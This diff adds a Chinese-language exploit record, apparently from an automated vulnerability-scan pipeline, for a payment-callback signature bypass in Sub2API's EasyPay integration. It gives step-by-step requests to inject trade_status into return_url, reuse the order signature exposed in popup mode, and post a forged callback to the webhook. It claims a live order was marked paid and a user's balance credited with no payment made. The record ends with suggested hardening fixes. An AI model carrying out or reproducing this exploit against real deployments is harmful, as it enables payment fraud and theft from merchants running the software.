@@ -1,0 +1,66 @@
+# Sub2API EasyPay 支付回调验签绕过（参数走私 / 签名串拼接不一致 → 伪造回调入账）
+
+- **code**: sub2api-easypay-支付回调验签绕过-参数走私-签名串拼接不一致-伪造回调入账
+- **kind**: exp
+- **category**: auth-bypass
+- **component**: Sub2API（EasyPay / 易支付）
+- **severity**: critical
+- **language**: python
+- **source**: self
+- **source_url**: https://github.com/Wei-Shaw/sub2api/issues/7881
+- **verified**: 1
+- **verified_note**: 在真实目标 example.com（Sub2API 部署，易支付上游 target266.example.com，payment_mode=popup）实测打通：伪造回调返回 HTTP 200 "success"；订单 463 由 PENDING 变为 COMPLETED（paid_at 2026-10-06T23:28:43+08:00）；用户 601 余额由 0 变为 1.00 CNY；全程未发生任何真实支付，且未使用任何商户密钥（pkey 未知）。证据：runs/easypay-forged-callback-463.txt，vuln id=1，http evidence id=1/2。
+- **path**: pocs/sub2api-easypay-支付回调验签绕过-参数走私-签名串拼接不一致-伪造回调入账/easypay_forge_callback.py
+- **tags**: 易支付,easypay,sub2api,验签绕过,参数走私,业务逻辑漏洞,伪造入账
+- **created_at**: 2026-10-06T15:29:32.215Z
+- **found_by**: vuln-scan
+
+## 描述
+
+Sub2API（Wei-Shaw/sub2api）易支付集成的回调验签绕过：下单接口接受用户提交的 return_url 且服务端不剥离其 query，buildPaymentReturnURL 按 key 重排后用户在 return_url 里注入的 trade_status=TRADE_SUCCESS 恰好落在签名串最末；popup 模式下下单签名随支付跳转 URL 暴露给付款人。攻击者用自己订单的签名，把 return_url 只编码到 status=success、让 &trade_status=TRADE_SUCCESS 以裸 & 升为顶层参数，回调验签重排拼接后与下单签名串逐字节相同 → 验签绕过、订单被判定支付成功并入账，全程无需商户 pkey。
+
+## 用法
+
+```
+python easypay_forge_callback.py（脚本内 TARGET/PID/OTN/SIGN/RU_CODES 需按本次下单结果替换）。
+真实目标已验证的命令序列：
+1) 下单：POST https://example.com/api/v1/payment/orders （带普通用户 JWT） body 见 content 步骤 1
+2) 伪造回调：target9.example.com("https://example.com/api/v1/payment/webhook/easypay", data=body,
+   headers={"Content-Type":"application/x-www-form-urlencoded"})
+3) 验证：GET /api/v1/payment/orders/463 → COMPLETED；GET /api/v1/user/profile → balance 0 → 1
+```
+
+## 正文
+
+```
+完整可运行脚本见落盘文件（easypay_forge_callback.py）。核心逻辑四步：
+
+步骤 1：用普通用户账号下单，return_url 里塞 trade_status=TRADE_SUCCESS
+POST /api/v1/payment/orders
+Content-Type: application/json
+{"amount":1,"payment_type":"alipay","order_type":"balance","is_mobile":false,"payment_source":"hosted_redirect",
+ "return_url":"https://<SITE>/payment/result?trade_status=TRADE_SUCCESS"}
+→ 响应 data.pay_url（popup 模式下是上游 submit.php 的跳转 URL），从里面读出全部参数：
+  pid / type / out_trade_no / notify_url / name / money / return_url / sign / sign_type
+  其中 return_url 解码后形如
+  https://<SITE>/payment/result?order_id=<ID>&out_trade_no=<OTN>&resume_token=<TOKEN>&status=success&trade_status=TRADE_SUCCESS
+  —— 用户注入的 trade_status 被服务端原样保留并排在值的最末（服务端按 key 重排重编码，t 排在 s 之后）
+
+步骤 2：把 return_url 截断到 status=success 为止（丢掉 &trade_status=TRADE_SUCCESS）
+
+步骤 3：构造回调 body，让 trade_status 以裸 & 升为顶层参数，sign 用步骤 1 读到的下单签名
+money=<money>&name=<name 编码>&notify_url=<notify_url 编码>&out_trade_no=<OTN>&pid=<pid>
+&return_url=<前缀，编码到 status%3Dsuccess>&trade_status=TRADE_SUCCESS&sign=<下单 sign>&sign_type=MD5&type=<type>
+
+步骤 4：POST 到 /api/v1/payment/webhook/easypay（无需认证）
+→ HTTP 200 body "success" 即验签通过；随后查 /api/v1/payment/orders/<ID> 应为 COMPLETED，
+  /api/v1/user/profile 的 balance 增加对应金额。
+
+为什么成立：服务端 easyPaySign 把参数值原样拼进签名串（值里的 & 直接成为签名串分隔符），回调验签又按 key 重排拼接；
+只要"回调解析出的参数集"与"下单参数集"拼接后逐字节相同，签名即复用成功——攻击者不需要 pkey。
+配合 CanonicalizeReturnURL 未剥离用户 query + popup 模式把下单签名回显给付款人，形成零密钥伪造入账。
+
+加固（来自 issue 修复建议）：① CanonicalizeReturnURL 里 parsed.RawQuery="" 剥离用户 query；
+② VerifyNotification 增加回调参数白名单（pid/trade_no/out_trade_no/type/name/money/trade_status/param/sign/sign_type），
+出现白名单外参数直接拒绝；③ 入账后异步调上游 api.php 复核订单；④ 改用非 popup 模式（扫码/mapi）可临时缓解。
+```
